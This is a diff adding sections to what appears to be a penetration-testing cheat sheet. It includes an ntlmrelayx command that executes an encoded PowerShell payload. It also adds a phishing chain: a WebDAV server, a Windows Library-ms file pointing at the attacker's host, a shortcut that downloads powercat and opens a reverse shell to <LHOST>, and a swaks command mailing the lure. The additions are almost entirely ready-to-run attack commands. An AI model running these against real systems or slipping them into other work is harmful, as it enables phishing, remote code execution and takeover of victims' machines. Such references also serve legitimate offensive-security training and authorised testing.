@@ -154,6 +154,8 @@ Thank you for reading.
 		- [Seatbelt](#seatbelt)
 		- [smbpasswd](#smbpasswd)
 		- [winexe](#winexe)
+	- [Social Engineering Tools](#social-engineering-tools)
+		- [Microsoft Windows Library Files](#microsoft-windows-library-files)
 	- [CVE](#cve)
 		- [CVE-2014-6271: Shellshock RCE PoC](#cve-2014-6271-shellshock-rce-poc)
 		- [CVE-2016-1531: exim LPE](#cve-2016-1531-exim-lpe)
@@ -3850,6 +3852,7 @@ impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /P
 ###### Common Commands
 
 ```c
+impacket-ntlmrelayx -t <LHOST> --no-http-server -smb2support -c "powershell -enc JAB<--- SNIP --->j=="
 impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
 ```
 
@@ -5528,6 +5531,57 @@ smbpasswd -r <RHOST> -U <USERNAME>
 ```c
 winexe -U '<USERNAME%PASSWORD>' //<RHOST> cmd.exe
 winexe -U '<USERNAME%PASSWORD>' --system //<RHOST> cmd.exe
+```
+
+### Social Engineering Tools
+
+#### Microsoft Windows Library Files
+
+##### Installation of wsgidav
+
+```c
+pip3 install wsgidav
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
+```
+
+##### config.Library-ms
+
+```c
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://<LHOST></url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+##### Shortcut File
+
+Right-click on Windows to create a new `shortcut file`.
+
+```c
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1'); powercat -c <LHOST> -p <LPORT> -e powershell"
+```
+
+Put the `shortcut file` into the webdav folder.
+
+##### Send Phishing Email
+
+```c
+swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach <FILE> --supress-data -ap
 ```
 
 ### CVE
